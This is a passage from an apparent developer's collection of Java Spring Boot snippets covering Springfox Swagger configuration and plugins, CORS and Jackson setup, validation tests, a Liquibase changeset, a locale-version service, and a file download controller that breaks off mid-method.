        for (String errorCode: errorCodes.values()) {
            errorCodesNote.append("<li>").append(errorCode).append("</li>");
        }

        errorCodesNote.append("</ul>");

        // Write new version of notes.
        context.operationBuilder().notes(errorCodesNote.toString()).build();
    }

    @Override
    public boolean supports(DocumentationType delimiter) {
        return SwaggerPluginSupport.pluginDoesApply(delimiter);
    }
}
-------------------------------------------------------------------------------------------------------
@ApiOperation(
    value = "Some description.",
    notes = "List of possible error codes:" +
            "<ul>" +
            "   <li>sms.verification.code.fail</li>" +
            "</ul>")
@PostMapping("/security/confirmation/check")
@ErrorCodes(values = {"sms.verification.code.fail"})
public ResponseDto check(@ApiParam @RequestBody @Valid RequestDto request) {... }
-------------------------------------------------------------------------------------------------------
import com.fasterxml.classmate.TypeResolver;
import org.springframework.core.annotation.Order;
import org.springframework.stereotype.Component;
import springfox.documentation.service.ResolvedMethodParameter;
import springfox.documentation.spi.DocumentationType;
import springfox.documentation.spi.service.ParameterBuilderPlugin;
import springfox.documentation.spi.service.contexts.ParameterContext;
import springfox.documentation.swagger.common.SwaggerPluginSupport;

import java.util.Optional;

// tag::parameter-builder-plugin[]
@Component
@Order(SwaggerPluginSupport.SWAGGER_PLUGIN_ORDER + 1000) //<1>
public class VersionApiReader implements ParameterBuilderPlugin {
  private TypeResolver resolver;

  public VersionApiReader(TypeResolver resolver) {
    this.resolver = resolver;
  }

  @Override
  public void apply(ParameterContext parameterContext) {
    ResolvedMethodParameter methodParameter = parameterContext.resolvedMethodParameter();
    Optional<VersionApi> requestParam = methodParameter.findAnnotation(VersionApi.class);
    if (requestParam.isPresent()) { //<2>
      parameterContext.parameterBuilder()
          .parameterType("header")
          .name("v")
          .type(resolver.resolve(String.class)); //<3>
    }
  }

  @Override
  public boolean supports(DocumentationType documentationType) {
    return true; //<4>
  }
}
// tag::parameter-builder-plugin[]
-------------------------------------------------------------------------------------------------------
import static springfox.documentation.builders.PathSelectors.regex;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

import com.google.common.base.Predicate;
import com.google.common.base.Predicates;

import springfox.documentation.builders.ApiInfoBuilder;
import springfox.documentation.builders.OAuthBuilder;
import springfox.documentation.builders.RequestHandlerSelectors;
import springfox.documentation.service.ApiInfo;
import springfox.documentation.service.AuthorizationCodeGrant;
import springfox.documentation.service.AuthorizationScope;
import springfox.documentation.service.GrantType;
import springfox.documentation.service.SecurityScheme;
import springfox.documentation.service.TokenEndpoint;
import springfox.documentation.service.TokenRequestEndpoint;
import springfox.documentation.spi.DocumentationType;
import springfox.documentation.spring.web.plugins.Docket;
import springfox.documentation.swagger.web.ApiKeyVehicle;
import springfox.documentation.swagger.web.SecurityConfiguration;
import springfox.documentation.swagger2.annotations.EnableSwagger2;

@Configuration
@EnableSwagger2
public class SwaggerConfig {
	@Value("${info.app.name}")
	private String serviceName;
	@Value("${info.app.desc}")
	private String serviceDesc;
	@Value("${uaa.clientId}")
	String clientId;
	@Value("${uaa.clientSecret}")
	String clientSecret;
	
	@Value("${uaa.url}")
	String oAuthServerUri;

	@Bean
	public Docket postsApi() {
		return new Docket(DocumentationType.SWAGGER_2).groupName("public-api")
				.apiInfo(apiInfo()).select().paths(postPaths())
				.apis(Predicates.not(RequestHandlerSelectors.basePackage("org.springframework.boot")))	
				.paths(springBootActuatorJmxPaths())
				.build()		
				.securitySchemes(Collections.singletonList(oauth()))
		;
	}

	private Predicate<String> postPaths() {
		return regex("/.*");
	}   

	private Predicate<String> springBootActuatorJmxPaths() {
		return regex("^/(?!env|restart|pause|resume|refresh).*$");
	} 

	
	private ApiInfo apiInfo() {
		return new ApiInfoBuilder().title(serviceName).description(serviceDesc).build();
	}	
	
	@Bean
	List<GrantType> grantTypes() {
		List<GrantType> grantTypes = new ArrayList<>();
		TokenRequestEndpoint tokenRequestEndpoint = new TokenRequestEndpoint(oAuthServerUri+"/oauth/authorize", clientId, clientSecret );
        TokenEndpoint tokenEndpoint = new TokenEndpoint(oAuthServerUri+"/oauth/token", "token");
        grantTypes.add(new AuthorizationCodeGrant(tokenRequestEndpoint, tokenEndpoint));
        return grantTypes;
	}
	
	@Bean
    SecurityScheme oauth() {
        return new OAuthBuilder()
                .name("OAuth2")
                .scopes(scopes())
                .grantTypes(grantTypes())
                .build();
    }
	
	private List<AuthorizationScope> scopes() {
		List<AuthorizationScope> list = new ArrayList();
		list.add(new AuthorizationScope("read_scope","Grants read access"));
		list.add(new AuthorizationScope("write_scope","Grants write access"));
		list.add(new AuthorizationScope("admin_scope","Grants read write and delete access"));
		return list;
    }	

	@Bean
    public SecurityConfiguration securityInfo() {
        return new SecurityConfiguration(clientId, clientSecret, "realm", clientId, "apiKey", ApiKeyVehicle.HEADER, "api_key", "");
    }
	
}
-------------------------------------------------------------------------------------------------------
@Configuration
public class WebSecurityConfiguration extends WebSecurityConfigurerAdapter {
  @Override
  public void configure(WebSecurity web) throws Exception {
    web.ignoring()
      .antMatchers(
        "/v2/api-docs",
        "/swagger-resources/**",
        "/swagger-ui.html**",
        "/webjars/**");
  }
}
-------------------------------------------------------------------------------------------------------
security:
  ignored: /swagger-resources/**
-------------------------------------------------------------------------------------------------------
@Configuration
public class WebConfig extends WebMvcConfigurerAdapter {

    //https://stackoverflow.com/questions/31724994/spring-data-rest-and-cors
    @Bean
    public FilterRegistrationBean corsFilter() {
        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();

        CorsConfiguration config = new CorsConfiguration().applyPermitDefaultValues();
        config.setAllowCredentials(false);
        source.registerCorsConfiguration("/**", config);

        FilterRegistrationBean bean = new FilterRegistrationBean(new CorsFilter(source));
        bean.setOrder(0);

        return bean;
    }
}
-------------------------------------------------------------------------------------------------------
  private static final String SPRING_HATEOAS_OBJECT_MAPPER = "_halObjectMapper";

  @Autowired
  @Qualifier(SPRING_HATEOAS_OBJECT_MAPPER)
  private ObjectMapper springHateoasObjectMapper;

  @Primary
  @Bean
  @Order(value=Ordered.HIGHEST_PRECEDENCE)
  @DependsOn(SPRING_HATEOAS_OBJECT_MAPPER)
  public ObjectMapper objectMapper() {
    return springHateoasObjectMapper;
  }
-------------------------------------------------------------------------------------------------------
@Configuration
public class MyWebAutoConfiguration extends WebMvcConfigurerAdapter {

    @Override
    public void extendMessageConverters(List<HttpMessageConverter<?>> converters) {
        ObjectMapper objectMapper = null;
        for (HttpMessageConverter converter : converters) {
            if (converter instanceof MappingJackson2HttpMessageConverter) {
                MappingJackson2HttpMessageConverter jacksonConverter =
                        ((MappingJackson2HttpMessageConverter) converter);

                if (objectMapper == null) {
                    objectMapper = jacksonConverter.getObjectMapper();
                } else {
                    jacksonConverter.setObjectMapper(objectMapper);
                }
            }
        }
    }
}
-------------------------------------------------------------------------------------------------------
@Configuration
public class SwaggerWsEndpointsConfig {

    @Primary
    @Bean
    public SwaggerResourcesProvider swaggerResourcesProvider(InMemorySwaggerResourcesProvider defaultResourcesProvider) {
        return () -> {
            SwaggerResource wsResource = new SwaggerResource();
            wsResource.setName("ws endpoints");
            wsResource.setSwaggerVersion("2.0");
            wsResource.setLocation("/v2/websockets.json");

            List<SwaggerResource> resources = new ArrayList<>(defaultResourcesProvider.get());
            resources.add(wsResource);
            return resources;
        };
    }
}
-------------------------------------------------------------------------------------------------------

import com.fasterxml.classmate.TypeResolver;
import org.joda.time.LocalDate;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.context.ApplicationContext;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.ComponentScan;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.context.request.async.DeferredResult;
import springfox.documentation.builders.ParameterBuilder;
import springfox.documentation.builders.PathSelectors;
import springfox.documentation.builders.RequestHandlerSelectors;
import springfox.documentation.builders.ResponseMessageBuilder;
import springfox.documentation.schema.ModelRef;
import springfox.documentation.schema.WildcardType;
import springfox.documentation.service.ApiKey;
import springfox.documentation.service.AuthorizationScope;
import springfox.documentation.service.SecurityReference;
import springfox.documentation.service.Tag;
import springfox.documentation.spi.DocumentationType;
import springfox.documentation.spi.service.contexts.SecurityContext;
import springfox.documentation.spring.web.plugins.Docket;
import springfox.documentation.swagger.web.DocExpansion;
import springfox.documentation.swagger.web.ModelRendering;
import springfox.documentation.swagger.web.OperationsSorter;
import springfox.documentation.swagger.web.SecurityConfiguration;
import springfox.documentation.swagger.web.SecurityConfigurationBuilder;
import springfox.documentation.swagger.web.TagsSorter;
import springfox.documentation.swagger.web.UiConfiguration;
import springfox.documentation.swagger.web.UiConfigurationBuilder;
import springfox.documentation.swagger2.annotations.EnableSwagger2;
import springfox.petstore.controller.PetController;

import java.util.List;

import static com.google.common.collect.Lists.*;
import static springfox.documentation.schema.AlternateTypeRules.*;

@SpringBootApplication
@EnableSwagger2
@ComponentScan(basePackageClasses = {
    PetController.class
})
public class Swagger2SpringBoot {

  public static void main(String[] args) {
    ApplicationContext ctx = SpringApplication.run(Swagger2SpringBoot.class, args);
  }


  @Bean
  public Docket petApi() {
    return new Docket(DocumentationType.SWAGGER_2)
        .select()
          .apis(RequestHandlerSelectors.any())
          .paths(PathSelectors.any())
          .build()
        .pathMapping("/")
        .directModelSubstitute(LocalDate.class, String.class)
        .genericModelSubstitutes(ResponseEntity.class)
        .alternateTypeRules(
            newRule(typeResolver.resolve(DeferredResult.class,
                typeResolver.resolve(ResponseEntity.class, WildcardType.class)),
                typeResolver.resolve(WildcardType.class)))
        .useDefaultResponseMessages(false)
        .globalResponseMessage(RequestMethod.GET,
            newArrayList(new ResponseMessageBuilder()
                .code(500)
                .message("500 message")
                .responseModel(new ModelRef("Error"))
                .build()))
        .securitySchemes(newArrayList(apiKey()))
        .securityContexts(newArrayList(securityContext()))
        .enableUrlTemplating(true)
        .globalOperationParameters(
            newArrayList(new ParameterBuilder()
                .name("someGlobalParameter")
                .description("Description of someGlobalParameter")
                .modelRef(new ModelRef("string"))
                .parameterType("query")
                .required(true)
                .build()))
        .tags(new Tag("Pet Service", "All apis relating to pets")) 
        .additionalModels(typeResolver.resolve(AdditionalModel.class)) 
        ;
  }

  @Autowired
  private TypeResolver typeResolver;

  private ApiKey apiKey() {
    return new ApiKey("mykey", "api_key", "header");
  }

  private SecurityContext securityContext() {
    return SecurityContext.builder()
        .securityReferences(defaultAuth())
        .forPaths(PathSelectors.regex("/anyPath.*"))
        .build();
  }

  List<SecurityReference> defaultAuth() {
    AuthorizationScope authorizationScope
        = new AuthorizationScope("global", "accessEverything");
    AuthorizationScope[] authorizationScopes = new AuthorizationScope[1];
    authorizationScopes[0] = authorizationScope;
    return newArrayList(
        new SecurityReference("mykey", authorizationScopes));
  }

  @Bean
  SecurityConfiguration security() {
    return SecurityConfigurationBuilder.builder()
        .clientId("test-app-client-id")
        .clientSecret("test-app-client-secret")
        .realm("test-app-realm")
        .appName("test-app")
        .scopeSeparator(",")
        .additionalQueryStringParams(null)
        .useBasicAuthenticationWithAccessCodeGrant(false)
        .build();
  }

  @Bean
  UiConfiguration uiConfig() {
    return UiConfigurationBuilder.builder()
        .deepLinking(true)
        .displayOperationId(false)
        .defaultModelsExpandDepth(1)
        .defaultModelExpandDepth(1)
        .defaultModelRendering(ModelRendering.EXAMPLE)
        .displayRequestDuration(false)
        .docExpansion(DocExpansion.NONE)
        .filter(false)
        .maxDisplayedTags(null)
        .operationsSorter(OperationsSorter.ALPHA)
        .showExtensions(false)
        .tagsSorter(TagsSorter.ALPHA)
        .supportedSubmitMethods(UiConfiguration.Constants.DEFAULT_SUBMIT_METHODS)
        .validatorUrl(null)
        .build();
  }
}
-------------------------------------------------------------------------------------------------------
    final Set<Integer> elements = new HashSet<>();
    Stream.of(1, 2, 3, 1, 9, 2, 5, 3, 4, 8, 2)
        .collect(Collectors.partitioningBy(elements::add))
        .forEach((isUnique, list) -> System.out.format("%s: %s%n", isUnique ? "unique" : "repetitive", list));

-------------------------------------------------------------------------------------------------------
@ExtendWith(SpringExtension.class)
@WebMvcTest(controllers = ValidateRequestBodyController.class)
class ValidateRequestBodyControllerTest {

  @Autowired
  private MockMvc mvc;

  @Autowired
  private ObjectMapper objectMapper;

  @Test
  void whenInputIsInvalid_thenReturnsStatus400() throws Exception {
    Input input = invalidInput();
    String body = objectMapper.writeValueAsString(input);

    mvc.perform(post("/validateBody")
            .contentType("application/json")
            .content(body))
            .andExpect(status().isBadRequest());
  }
}

@ExtendWith(SpringExtension.class)
@DataJpaTest
class ValidatingRepositoryTest {

  @Autowired
  private ValidatingRepository repository;

  @Autowired
  private EntityManager entityManager;

  @Test
  void whenInputIsInvalid_thenThrowsException() {
    Input input = invalidInput();

    assertThrows(ConstraintViolationException.class, () -> {
      repository.save(input);
      entityManager.flush();
    });
  }
}

@ExtendWith(SpringExtension.class)
@SpringBootTest
class ProgrammaticallyValidatingServiceTest {

  @Autowired
  private ProgrammaticallyValidatingService service;

  @Test
  void whenInputIsInvalid_thenThrowsException(){
    Input input = invalidInput();

    assertThrows(ConstraintViolationException.class, () -> {
      service.validateInput(input);
    });
  }

  @Test
  void givenInjectedValidator_whenInputIsInvalid_thenThrowsException(){
    Input input = invalidInput();

    assertThrows(ConstraintViolationException.class, () -> {
      service.validateInputWithInjectedValidator(input);
    });
  }
}

@ExtendWith(SpringExtension.class)
@SpringBootTest
class ValidatingServiceWithGroupsTest {

  @Autowired
  private ValidatingServiceWithGroups service;

  @Test
  void whenInputIsInvalidForCreate_thenThrowsException() {
    InputWithGroups input = validInput();
    input.setId(42L);
    
    assertThrows(ConstraintViolationException.class, () -> {
      service.validateForCreate(input);
    });
  }

  @Test
  void whenInputIsInvalidForUpdate_thenThrowsException() {
    InputWithGroups input = validInput();
    input.setId(null);
    
    assertThrows(ConstraintViolationException.class, () -> {
      service.validateForUpdate(input);
    });
  }
}
-------------------------------------------------------------------------------------------------------
package com.paragon.microservices.distributor.service.impl;

import com.google.common.base.Objects;
import com.paragon.microservices.distributor.model.entity.LocaleEntity;
import com.paragon.microservices.distributor.model.entity.LocaleVersionEntity;
import com.paragon.microservices.distributor.model.entity.QLocaleVersionEntity;
import com.paragon.microservices.distributor.model.entity.VersionEntity;
import com.paragon.microservices.distributor.repository.LocaleVersionRepository;
import com.paragon.microservices.distributor.service.interfaces.LocaleVersionService;
import lombok.*;
import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Isolation;
import org.springframework.transaction.annotation.Transactional;

import java.util.HashSet;
import java.util.List;
import java.util.Optional;
import java.util.Set;
import java.util.stream.Collectors;

import static com.google.common.collect.Sets.newHashSet;
import static com.paragon.mailingcontour.commons.constraint.utils.ConstraintUtils.not;
import static com.paragon.mailingcontour.commons.exception.InvalidParameterException.throwInvalidParameter;
import static com.paragon.mailingcontour.commons.utils.ServiceUtils.streamOf;
import static com.paragon.microservices.distributor.system.utils.ServiceUtils.contains;

/**
 * {@link LocaleVersionService} implementation
 */
@Slf4j
@Service
@EqualsAndHashCode(callSuper = true)
@ToString(callSuper = true)
@Getter(AccessLevel.PROTECTED)
@RequiredArgsConstructor
public class LocaleVersionServiceImpl extends AuditServiceImpl<LocaleVersionEntity, QLocaleVersionEntity, LocaleVersionEntity.LocaleVersionID> implements LocaleVersionService {
    private final LocaleVersionRepository localeVersionRepository;

    @Override
    @Transactional(isolation = Isolation.READ_COMMITTED)
    @SuppressWarnings("unchecked")
    public <S extends LocaleVersionEntity> Iterable<S> createLocaleVersionBindings(final VersionEntity version, final Iterable<LocaleEntity> locales) {
        log.info("Creating locale version records by input parameters: version: {}, locales: {}", version, locales);
        return (Iterable<S>) Optional.ofNullable(version)
                .map(value -> streamOf(locales)
                        .map(locale -> this.buildLocaleVersionEntity(locale, value))
                        .collect(Collectors.toList()))
                .map(this::saveAll)
                .orElseThrow(() -> throwInvalidParameter(this.getMessageSource(), version, locales));
    }

    @Override
    @Transactional(isolation = Isolation.READ_COMMITTED)
    public LocaleVersionEntity createLocaleVersionBinding(final VersionEntity version, final LocaleEntity locale) {
        log.info("Creating locale version record by input parameters: version: {}, locale: {}", version, locale);
        return Optional.ofNullable(version)
                .map(value -> this.buildLocaleVersionEntity(locale, value))
                .map(this::save)
                .orElseThrow(() -> throwInvalidParameter(this.getMessageSource(), version, locale));
    }

    @Override
    @Transactional(isolation = Isolation.READ_COMMITTED)
    @SuppressWarnings("unchecked")
    public <S extends LocaleVersionEntity> Iterable<S> deleteLocaleVersionBindings(final VersionEntity version, final Iterable<LocaleEntity> locales) {
        log.info("Deleting locale version records by input parameters: version: {}, locales: {}", version, locales);
        return (Iterable<S>) Optional.ofNullable(version)
                .map(value -> streamOf(locales)
                        .map(locale -> this.buildLocaleVersionEntity(locale, value))
                        .collect(Collectors.toList()))
                .map(this::deleteAll)
                .orElseThrow(() -> throwInvalidParameter(this.getMessageSource(), version, locales));
    }

    @Override
    @Transactional(isolation = Isolation.READ_COMMITTED)
    public LocaleVersionEntity deleteLocaleVersionBinding(final VersionEntity version, final LocaleEntity locale) {
        log.info("Deleting locale version record by input parameters: version: {}, locale: {}", version, locale);
        return Optional.ofNullable(version)
                .map(value -> this.buildLocaleVersionEntity(locale, value))
                .map(this::delete)
                .orElseThrow(() -> throwInvalidParameter(this.getMessageSource(), version, locale));
    }

    @Override
    @Transactional(isolation = Isolation.READ_COMMITTED)
    @SuppressWarnings("unchecked")
    public <S extends LocaleVersionEntity> Iterable<S> updateLocaleVersionBindings(final VersionEntity version, final Iterable<LocaleEntity> locales) {
        log.info("Updating locale version records by input parameters: version: {}, locales: {}", version, locales);
        return (Iterable<S>) Optional.ofNullable(version)
                .map(entity -> {
                            final Set<LocaleVersionEntity> localeVersions = new HashSet<>();
                            final List<LocaleVersionEntity> l = streamOf(entity.getLocales())
                                    .map(locale -> {
                                        if (newHashSet(locales).contains(locale.getLocale())) {
                                            localeVersions.add(locale);
                                        } else {
                                            final Set<LocaleVersionEntity> result = locale.getLocale().getVersions().stream().filter(lo -> !Objects.equal(lo, locale)).collect(Collectors.toSet());
                                            locale.getLocale().setVersions(result);
                                        }
                                        return locale;
                                    })
                                    .filter(not(locale -> contains(locales, locale.getLocale())))
                                    .collect(Collectors.toList());
                            version.setLocales(localeVersions);
                            return l;
                        }
                )
                //.map(this::deleteAll)
                .map(entity -> {
                    streamOf(locales)
                            .filter(locale -> version.getLocales().stream().noneMatch(l -> Objects.equal(l.getLocale(), locale)))
                            .map(locale -> this.buildLocaleVersionEntity(locale, version))
                            .forEach(version::addLocale);
                    return entity;
                })
                .map(entity -> version.getLocales())
                //.map(this::saveAll)
                .orElseThrow(() -> throwInvalidParameter(this.getMessageSource(), version, locales));
    }

    private LocaleVersionEntity buildLocaleVersionEntity(final LocaleEntity locale, final VersionEntity version) {
        final LocaleVersionEntity localeVersionEntity = new LocaleVersionEntity();
        localeVersionEntity.setLocale(locale);
        localeVersionEntity.setVersion(version);
        return localeVersionEntity;
    }

    @Override
    protected LocaleVersionRepository getRepository() {
        return this.localeVersionRepository;
    }
}
-------------------------------------------------------------------------------------------------------
  #  - changeSet:
  #      id: 18
  #      author: chuprikov (generated)
  #      objectQuotingStrategy: QUOTE_ALL_OBJECTS
  #      preConditions:
  #        - onFail: MARK_RAN
  #        - not:
  #            - tableExists:
  #                tableName: REVCHANGES
  #      changes:
  #        - createTable:
  #            columns:
  #              - column:
  #                  constraints:
  #                    nullable: false
  #                  name: REV
  #                  type: INTEGER
  #              - column:
  #                  constraints:
  #                    nullable: false
  #                  name: ENTITYNAME
  #                  type: VARCHAR(255)
  #            tableName: REVCHANGES
  #  - changeSet:
  #      id: 19
  #      author: chuprikov (generated)
  #      objectQuotingStrategy: QUOTE_ALL_OBJECTS
  #      preConditions:
  #        - onFail: MARK_RAN
  #        - not:
  #            - primaryKeyExists:
  #                primaryKeyName: REVCHANGES_pkey
  #                tableName: REVCHANGES
  #      changes:
  #        - addPrimaryKey:
  #            columnNames: REV
  #            constraintName: REVCHANGES_pkey
  #            tableName: REVCHANGES
  #  - changeSet:
  #      id: 20
  #      author: chuprikov (generated)
  #      objectQuotingStrategy: QUOTE_ALL_OBJECTS
  #      preConditions:
  #        - onFail: MARK_RAN
  #        - not:
  #            - foreignKeyConstraintExists:
  #                foreignKeyName: fk_revchanges_revinfo_id
  #      changes:
  #        - addForeignKeyConstraint:
  #            baseColumnNames: REV
  #            baseTableName: REVCHANGES
  #            constraintName: fk_revchanges_revinfo_id
  #            deferrable: true
  #            initiallyDeferred: true
  #            onDelete: CASCADE
  #            onUpdate: RESTRICT
  #            referencedColumnNames: id
  #            referencedTableName: REVINFO
-------------------------------------------------------------------------------------------------------
package com.paragon.microservices.distributor.controller.impl;

import com.google.common.io.ByteStreams;
import com.paragon.mailingcontour.commons.security.model.AuthenticatedUser;
import com.paragon.microservices.distributor.controller.interfaces.DownloadController;
import com.paragon.microservices.distributor.model.domain.*;
import com.paragon.microservices.distributor.model.entity.FileEntity;
import com.paragon.microservices.distributor.model.entity.ProductEntity;
import com.paragon.microservices.distributor.model.enumeration.DownloadStatus;
import com.paragon.microservices.distributor.repository.ProductRepository;
import com.paragon.microservices.distributor.repository.VersionRepository;
import com.paragon.microservices.distributor.service.impl.VersionServiceImpl;
import com.paragon.microservices.distributor.service.interfaces.DownloadService;
import com.paragon.microservices.distributor.service.interfaces.FileService;
import com.paragon.microservices.distributor.service.interfaces.FileTransferService;
import com.paragon.microservices.distributor.service.interfaces.SessionService;
import com.paragon.microservices.distributor.system.constraint.FileNamePattern;
import lombok.AccessLevel;
import lombok.Getter;
import lombok.extern.slf4j.Slf4j;
import org.apache.tomcat.util.http.fileupload.IOUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.ApplicationEventPublisher;
import org.springframework.context.MessageSource;
import org.springframework.http.HttpStatus;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.transaction.annotation.Transactional;
import org.springframework.validation.annotation.Validated;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.servlet.mvc.method.annotation.StreamingResponseBody;
import org.springframework.web.servlet.view.RedirectView;

import java.io.BufferedInputStream;
import java.io.IOException;
import java.util.UUID;
import java.util.concurrent.CompletableFuture;
import java.util.function.Consumer;
import java.util.stream.Stream;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

import static com.paragon.microservices.distributor.system.configuration.SwaggerConfiguration.ResourceEndpoint.DOWNLOAD_RESOURCE_ENDPOINT;
import static com.paragon.microservices.distributor.system.utils.HeaderUtils.getFileDownloadHeaders;

/**
 * {@link DownloadController} implementation
 */
@Slf4j
@Getter(AccessLevel.PROTECTED)
@RestController
@Validated
@Transactional(rollbackFor = Exception.class, readOnly = true)
@RequestMapping(
        value = DOWNLOAD_RESOURCE_ENDPOINT,
        produces = {MediaType.APPLICATION_JSON_UTF8_VALUE}
)
public class DownloadControllerImpl extends BaseControllerImpl implements DownloadController {
    private final DownloadService downloadService;
    private final FileTransferService fileTransferService;
    private final FileService fileService;
    private final ApplicationEventPublisher eventPublisher;

    @Autowired
    public DownloadControllerImpl(final MessageSource messageSource,
                                  final DownloadService downloadService,
                                  final FileTransferService fileTransferService,
                                  final FileService fileService,
                                  final ApplicationEventPublisher eventPublisher) {
        super(messageSource);
        this.downloadService = downloadService;
        this.fileTransferService = fileTransferService;
        this.fileService = fileService;
        this.eventPublisher = eventPublisher;
    }

    @Override
    @GetMapping(name = "generateDownloadLinkByIds", params = {"productId", "versionId", "binaryId"})
    public RedirectView generateDownloadLinkByIds(final UUID productId,
                                                  final UUID versionId,
                                                  final UUID binaryId,
                                                  final AuthenticatedUser authenticatedUser) {
        return Stream.of(this.getDownloadService().generateDownloadLink(binaryId, authenticatedUser.getUserId()))
                .map(downloadLink -> {
                    final RedirectView redirectView = new RedirectView(downloadLink.getUrl(), true);
                    redirectView.setStatusCode(HttpStatus.PERMANENT_REDIRECT);
                    return redirectView;
                })
                .findFirst()
                .get();
    }

    @Override
    @GetMapping(name = "generateDownloadLinkByNames", params = {"sku", "version", "locale", "platform"})
    public RedirectView generateDownloadLinkByNames(final String sku,
                                                    final String version,
                                                    final String locale,
                                                    final String platform,
                                                    final AuthenticatedUser authenticatedUser) {
        return Stream.of(FileSearchParameters.of(sku, version, locale, platform, authenticatedUser.getUserId()))
                .map(params -> this.getDownloadService().generateDownloadLink(params))
                .map(downloadLink -> {
                    final RedirectView redirectView = new RedirectView(downloadLink.getUrl(), true);
                    redirectView.setStatusCode(HttpStatus.PERMANENT_REDIRECT);
                    return redirectView;
                })
                .findFirst()
                .get();
    }

    @GetMapping("/{sessionId}/{fileName}")
    @Override
    public ResponseEntity<StreamingResponseBody> getResourceAsStream(@PathVariable final UUID sessionId,
                                                                     @PathVariable final String fileName) {
        return Stream.of(this.getFileTransferService().getFileData(sessionId))
                .map(fileData -> ResponseEntity.ok()
                        .headers(getFileDownloadHeaders(fileData.getFileMetaData()))
                        .body(this.toByteStreamResponseBody(fileData))
                )
                .findFirst()
                .get();
    }

    @GetMapping("/2/{sessionId}/{fileName}")
    public ResponseEntity<StreamingResponseBody> getResourceAsStream2(@PathVariable final UUID sessionId,
                                                                      @PathVariable @FileNamePattern final String fileName) {
        return Stream.of(this.getFileTransferService().getFileData(sessionId))
                .map(fileData -> ResponseEntity.ok()
                        .headers(getFileDownloadHeaders(fileData.getFileMetaData()))
                        .body(this.toZipStreamResponseBody(fileData))
                )
                .findFirst()
                .get();
    }

    @GetMapping("/3/{sessionId}/{fileName}")
    public ResponseEntity<StreamingResponseBody> getResourceAsStream3(@PathVariable final UUID sessionId,
                                                                      @PathVariable @FileNamePattern final String fileName) {
        return Stream.of(this.getFileTransferService().getFileData(sessionId))
                .map(fileData -> ResponseEntity.ok()
                        .headers(getFileDownloadHeaders(fileData.getFileMetaData()))
                        .body(this.toBufferedStreamResponseBody(fileData))
                )
                .findFirst()
                .get();
    }

    @GetMapping("/4/{sessionId}/{fileName}")
    public ResponseEntity<StreamingResponseBody> getResourceAsStream4(@PathVariable final UUID sessionId,
                                                                      @PathVariable @FileNamePattern final String fileName) {
        return Stream.of(this.getFileTransferService().getFileData(sessionId))
                .map(fileData -> ResponseEntity.ok()
                        .headers(getFileDownloadHeaders(fileData.getFileMetaData()))
                        .body(this.toStreamResponseBody(fileData))
                )
                .findFirst()
                .get();
    }

    @Autowired
    private SessionService sessionService;
    @Autowired
    private ProductRepository productRepository;
    @Autowired
    private VersionServiceImpl versionService;
    @Autowired
    private VersionRepository versionRepository;

    @GetMapping("/myusers2")
    public ResponseEntity<FileEntity> findAllByQuerydsl2(@RequestParam(value = "sku") String sku,
                                                         @RequestParam(value = "version", required = false) String version,
                                                         @RequestParam(value = "locale") String locale,
                                                         @RequestParam(value = "platform") String platform) {
        return ResponseEntity.ok(this.getFileService().searchFileRecord(FileSearchParameters.of(sku, version, locale, platform)).get());
    }

    @GetMapping("/user")
    public ResponseEntity<CompletableFuture<Iterable<ProductEntity>>> user() {
        return ResponseEntity.ok().body(this.getProductRepository().findByUserIsCurrentUser());
    }

    @GetMapping("/created")
    public ResponseEntity init() {
        final Session session = new Session();
        session.setId("c108cda3-8b4b-483d-a987-d65e6bfe3024");
        session.setFilepath("C:\\git-project\\paragon.microservices.distributor");
        session.setFilename("lombok.config");
        session.setDownloadStatus(DownloadStatus.NEW);
        this.getSessionService().save(session);
        return ResponseEntity.ok().build();
    }

    private StreamingResponseBody toByteStreamResponseBody(final FileData fileData) {
        return outputStream -> {
            this.notifyEvent(fileData).accept(DownloadStatus.DOWNLOADING);
            try {
                ByteStreams.copy(fileData.getFileStream(), outputStream);
                outputStream.flush();
                this.notifyEvent(fileData).accept(DownloadStatus.FINISHED);
            } catch (final IOException ex) {
                log.error("Unable to stream file source, message: {}", ex.getMessage());
                this.notifyEvent(fileData).accept(DownloadStatus.INTERRUPTED);
            }
        };
    }

    private StreamingResponseBody toZipStreamResponseBody(final FileData fileData) {
        return outputStream -> {
            this.notifyEvent(fileData).accept(DownloadStatus.DOWNLOADING);
            final ZipOutputStream zipOut = new ZipOutputStream(outputStream);
            try {
                final ZipEntry zipEntry = new ZipEntry(fileData.getFileMetaData().getFileName());
                zipOut.putNextEntry(zipEntry);

                final byte[] bytes = new byte[1024];
                int length;
                while ((length = fileData.getFileStream().read(bytes)) >= 0) {
                    zipOut.write(bytes, 0, length);
                }
                fileData.getFileStream().close();
                zipOut.close();
                this.notifyEvent(fileData).accept(DownloadStatus.FINISHED);
            } catch (final IOException ex) {
                log.error("Unable to stream file source, message: {}", ex.getMessage());
                this.notifyEvent(fileData).accept(DownloadStatus.INTERRUPTED);
            }
        };
    }

    private StreamingResponseBody toBufferedStreamResponseBody(final FileData fileData) {
        return outputStream -> {
            this.notifyEvent(fileData).accept(DownloadStatus.DOWNLOADING);
            try (final BufferedInputStream br = new BufferedInputStream(fileData.getFileStream())) {
                byte[] contents = new byte[1024];
                while (br.read(contents) != -1) {
                    outputStream.write(contents);
                    outputStream.flush();
                    contents = new byte[1024];
                }
                this.notifyEvent(fileData).accept(DownloadStatus.FINISHED);
            } catch (IOException ex) {
                try {
                    fileData.getFileStream().close();
                } catch (IOException closingException) {
                    log.warn("could not close command result, a http connection may be leaked !", closingException);
                }
                log.error("Unable to stream file source, message: {}", ex.getMessage());
                this.notifyEvent(fileData).accept(DownloadStatus.INTERRUPTED);
            }
        };
    }

    private StreamingResponseBody toStreamResponseBody(final FileData fileData) {
        return outputStream -> {
            try {
                this.notifyEvent(fileData).accept(DownloadStatus.DOWNLOADING);
                IOUtils.copyLarge(fileData.getFileStream(), outputStream);
